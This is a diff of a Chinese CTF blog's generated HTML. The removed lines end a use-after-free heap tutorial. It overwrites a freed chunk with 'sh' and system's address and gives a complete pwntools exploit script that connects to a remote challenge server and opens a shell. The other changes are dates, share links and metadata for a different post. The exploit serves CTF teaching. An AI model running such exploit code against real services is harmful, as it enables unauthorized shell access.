-<p>我们用edit函数修改chunk的内容为  <strong>“sh\x00\x00”</strong></p>
-<p>然后溢出到下一个字长 修改其内容为system的地址</p>
-<p>这样当我们执行show函数的时候 其就会使用chunk内的sh当作system函数的参数</p>
-<p>因此我们成功实现了系统调用</p>
-<p>这里再解释一下为什么是 sh\x00\x00 因为是32位的程序嘛</p>
-<p>一个字长只有4个字节 如果我们使用的是&#x2F;bin&#x2F;sh显然字节不够</p>
-<p>所以使用sh也能达成对应的操作 至于后面的两个\x00 显然是为了填充字节 又不至于破坏sh字符串</p>
-<p>所以最后我们的exp是：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">io = remote(<span class="string">&quot;1.14.71.254&quot;</span>,<span class="number">28340</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>():</span><br><span class="line">    io.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params"><span class="built_in">id</span>,content</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Input page\n&quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Input your strings\n&quot;</span>)</span><br><span class="line">    io.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params"><span class="built_in">id</span></span>):</span><br><span class="line">    io.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">&quot;3&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Input page\n&quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params"><span class="built_in">id</span></span>):</span><br><span class="line">    io.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">&quot;4&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Input page\n&quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&quot;4.show&quot;</span>)</span><br><span class="line">add()</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">add()</span><br><span class="line">payload = <span class="string">b&quot;sh\x00\x00&quot;</span></span><br><span class="line"><span class="built_in">len</span>(payload)</span><br><span class="line">payload +=p32(<span class="number">0x8048642</span>)</span><br><span class="line">edit(<span class="number">1</span>,payload)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
-
-<p>ps:从堆开始 我们将会频繁使用python中的def 因为菜单题的重复接收输送实在是太多了</p>
-<p>如果看不懂这样书写的语法 可以自行百度学习</p>
 
   </div>
   
@@ -2545,10 +2492,10 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
     <div class='new-meta-box'>
       
         
-          <div class="new-meta-item date" itemprop="dateModified" datetime="2022-10-01T21:51:40+08:00">
+          <div class="new-meta-item date" itemprop="dateModified" datetime="2022-11-12T09:22:33+08:00">
   <a class='notlink'>
     <i class="fa-solid fa-edit fa-fw" aria-hidden="true"></i>
-    <p>更新于：Oct 1, 2022</p>
+    <p>更新于：Nov 12, 2022</p>
   </a>
 </div>
 
@@ -2567,7 +2514,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
       
         <a class="-mob-share-qq" title="" rel="external nofollow noopener noreferrer noopener"
           
-          target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://example.com/2022/10/01/UAF/&title=UAF - Chen&summary="
+          target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://example.com/2022/11/12/ciscn-2019-es-2/&title=ciscn_2019_es_2 - Chen&summary="
           
           >
           
@@ -2579,7 +2526,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
       
         <a class="-mob-share-qzone" title="" rel="external nofollow noopener noreferrer noopener"
           
-          target="_blank" href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=http://example.com/2022/10/01/UAF/&title=UAF - Chen&summary="
+          target="_blank" href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=http://example.com/2022/11/12/ciscn-2019-es-2/&title=ciscn_2019_es_2 - Chen&summary="
           
           >
           
@@ -2591,7 +2538,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
       
         <a class="-mob-share-weibo" title="" rel="external nofollow noopener noreferrer noopener"
           
-          target="_blank" href="http://service.weibo.com/share/share.php?url=http://example.com/2022/10/01/UAF/&title=UAF - Chen&summary="
+          target="_blank" href="http://service.weibo.com/share/share.php?url=http://example.com/2022/11/12/ciscn-2019-es-2/&title=ciscn_2019_es_2 - Chen&summary="
           
           >
           
@@ -2624,18 +2571,13 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
   
     <div class="prev-next">
       
-        <a class='prev' href='/2022/10/03/%E6%BA%A2%E5%87%BA%E8%A6%86%E7%9B%96%E5%8F%98%E9%87%8F/'>
-          <p class='title'><i class="fa-solid fa-chevron-left" aria-hidden="true"></i>溢出覆盖变量</p>
-          <p class='content'>其实这个知识点应该算是栈溢出后面就可以讲的了 顺序没把握好 不过还好这篇的例题有点干货 就不丢到基础知识扩展那个专题了 在这面说吧
-我们已经学习了基础的栈溢出对吧 总归就是覆盖栈上的高地址内的数...</p>
-        </a>
       
-      
-        <a class='next' href='/2022/09/30/pwn%E9%9C%80%E8%A6%81%E7%9A%84%E4%B8%80%E4%BA%9B%E5%B7%A5%E5%85%B7%E5%AE%89%E8%A3%85/'>
-          <p class='title'>pwn需要的一些工具安装<i class="fa-solid fa-chevron-right" aria-hidden="true"></i></p>
-          <p class='content'>这篇文章用来记录搭建pwn手需要的环境 要下载什么工具以及如何下载 其他方向的可以当个参考
-vimVim是一个类似于Vi的著名的功能强大、高度可定制的文本编辑器
-1sudo apt instal...</p>
+        <a class='next' href='/2022/11/11/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/'>
+          <p class='title'>buu刷题记录<i class="fa-solid fa-chevron-right" aria-hidden="true"></i></p>
+          <p class='content'>不打算像pwn一样详细 记录一下自己在buu刷题过程学习的知识点
+[极客大挑战 2019]EasySQL
+靶机开启后 要求我们输入用户名和密码
+这里随便输入后 会发现账号密码都显示在url里  ...</p>
         </a>
       
     </div>
@@ -2651,7 +2593,7 @@ vimVim是一个类似于Vi的著名的功能强大、高度可定制的文本编
 
   <article class="post white-box shadow floatable blur" id="comments">
     <span hidden>
-      <meta itemprop="discussionUrl" content="/2022/10/01/UAF/index.html#comments">
+      <meta itemprop="discussionUrl" content="/2022/11/12/ciscn-2019-es-2/index.html#comments">
     </span>
     <p ct><i class='fa-solid fa-comments'></i> 评论</p>
     
@@ -2683,19 +2625,9 @@ vimVim是一个类似于Vi的著名的功能强大、高度可定制的文本编
   
 
 
-  <section class="widget toc-wrapper desktop mobile " id="toc-div" >
-    
-  <header>
-    
-      <i class="fa-solid fa-list fa-fw" aria-hidden="true"></i><span class='name'>本文目录</span>
-    
-  </header>
-
-
-    <div class='content'>
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#UAF%E5%8E%9F%E7%90%86"><span class="toc-text">UAF原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9C%9F%E9%A2%98%E5%A4%8D%E7%8E%B01"><span class="toc-text">真题复现1</span></a></li></ol>
-    </div>
-  </section>
+  <div class="">
+    <!-- pjax占位 -->
+  </div>
 
   
 
@@ -3267,7 +3199,7 @@ vimVim是一个类似于Vi的著名的功能强大、高度可定制的文本编
 </script>
 
 
-  <script type="application/ld+json">[{"@context":"http://schema.org","@type":"Organization","name":"Chen","url":"http://example.com/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},{"@context":"http://schema.org","@type":"Person","name":"Chen","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/","sameAs":["https://github.com/volantis-x"],"description":"ChenBlog"},{"@context":"http://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"item":{"@id":"http://example.com/","name":"Chen"}},{"@type":"ListItem","position":2,"item":{"@id":"http://example.com/categories/堆/","name":"堆"}},{"@type":"ListItem","position":3,"item":{"@id":"http://example.com/2022/10/01/UAF/","name":"UAF"}}]},{"@context":"http://schema.org","@type":"WebSite","name":"Chen","url":"http://example.com/","keywords":null,"description":"ChenBlog","author":{"@type":"Person","name":"Chen","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/","description":"ChenBlog"},"publisher":{"@type":"Organization","name":"Chen","url":"http://example.com/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"potentialAction":{"@type":"SearchAction","name":"Site Search","target":{"@type":"EntryPoint","urlTemplate":"http://example.com?s={search_term_string}"},"query-input":"required name=search_term_string"}},{"@context":"http://schema.org","@type":"BlogPosting","headline":"UAF","description":"ChenBlog","inLanguage":"en","mainEntityOfPage":{"@type":"WebPage","@id":"http://example.com/2022/10/01/UAF/"},"author":{"@type":"Person","name":"Chen","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/"},"publisher":{"@type":"Organization","name":"Chen","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"url":"http://example.com/2022/10/01/UAF/","wordCount":0,"datePublished":"2022-10-01T13:10:23.000Z","dateModified":"2022-10-01T13:51:40.139Z","articleSection":"堆","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}}]</script>
+  <script type="application/ld+json">[{"@context":"http://schema.org","@type":"Organization","name":"Chen","url":"http://example.com/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},{"@context":"http://schema.org","@type":"Person","name":"Chen","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/","sameAs":["https://github.com/volantis-x"],"description":"ChenBlog"},{"@context":"http://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"item":{"@id":"http://example.com/","name":"Chen"}},{"@type":"ListItem","position":2,"item":{"@id":"http://example.com/categories/wp/","name":"wp"}},{"@type":"ListItem","position":3,"item":{"@id":"http://example.com/2022/11/12/ciscn-2019-es-2/","name":"ciscn_2019_es_2"}}]},{"@context":"http://schema.org","@type":"WebSite","name":"Chen","url":"http://example.com/","keywords":null,"description":"ChenBlog","author":{"@type":"Person","name":"Chen","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/","description":"ChenBlog"},"publisher":{"@type":"Organization","name":"Chen","url":"http://example.com/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"potentialAction":{"@type":"SearchAction","name":"Site Search","target":{"@type":"EntryPoint","urlTemplate":"http://example.com?s={search_term_string}"},"query-input":"required name=search_term_string"}},{"@context":"http://schema.org","@type":"BlogPosting","headline":"ciscn_2019_es_2","description":"ChenBlog","inLanguage":"en","mainEntityOfPage":{"@type":"WebPage","@id":"http://example.com/2022/11/12/ciscn-2019-es-2/"},"author":{"@type":"Person","name":"Chen","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/"},"publisher":{"@type":"Organization","name":"Chen","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"url":"http://example.com/2022/11/12/ciscn-2019-es-2/","wordCount":0,"datePublished":"2022-11-12T00:46:28.000Z","dateModified":"2022-11-12T01:22:33.335Z","articleSection":"wp","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}}]</script>
 
 
 
